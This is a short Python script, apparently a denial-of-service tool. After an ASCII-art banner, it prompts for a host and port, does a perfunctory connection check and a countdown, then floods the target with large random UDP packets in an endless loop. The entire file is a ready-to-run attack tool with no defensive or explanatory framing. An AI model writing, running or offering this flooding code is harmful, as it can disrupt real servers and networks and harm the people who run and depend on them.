import socket
import random
import os
import time
import sys

def checkForTarget(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        connection = s.connect_ex((ip, int(port)))
        s.shutdown(2)
        return True
    except:
        return False

def attack(ip, port):
    countdown = 5
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(47680)
    while countdown > 0:
        print("Attack Starting in " + str(countdown))
        countdown = countdown - 1
        time.sleep(0.5)

    while True:
         s.sendto(bytes, (ip, int(port)))
         print ("Sent bytes" + " to " + ip + ", port: " + str(port))

print("▗▄▄▄   ▗▄▄▖▗▄▄▖  ▗▄▖ ▗▖  ▗▖     ▗▄▖ ▗▖  ▗▖▗▖  ▗▖▗▄▄▄▖▗▖ ▗▖▗▄▄▄▖▗▖    ▗▄▖▗▄▄▄▖▗▄▖ ▗▄▄▖ ")
print("▐▌  █ ▐▌   ▐▌ ▐▌▐▌ ▐▌▐▛▚▞▜▌    ▐▌ ▐▌▐▛▚▖▐▌▐▛▚▖▐▌  █  ▐▌ ▐▌  █  ▐▌   ▐▌ ▐▌ █ ▐▌ ▐▌▐▌ ▐▌")
print("▐▌  █ ▐▌▝▜▌▐▛▀▚▖▐▛▀▜▌▐▌  ▐▌    ▐▛▀▜▌▐▌ ▝▜▌▐▌ ▝▜▌  █  ▐▛▀▜▌  █  ▐▌   ▐▛▀▜▌ █ ▐▌ ▐▌▐▛▀▚▖")
print("▐▙▄▄▀ ▝▚▄▞▘▐▌ ▐▌▐▌ ▐▌▐▌  ▐▌    ▐▌ ▐▌▐▌  ▐▌▐▌  ▐▌▗▄█▄▖▐▌ ▐▌▗▄█▄▖▐▙▄▄▖▐▌ ▐▌ █ ▝▚▄▞▘▐▌ ▐▌")

ip = input("Enter Host Adress: ")
port = input("Enter port number: ")


if checkForTarget(ip, port) == True:
    print("Host Connected")
    attack(ip, port)

else:
    print("Host connection failed")

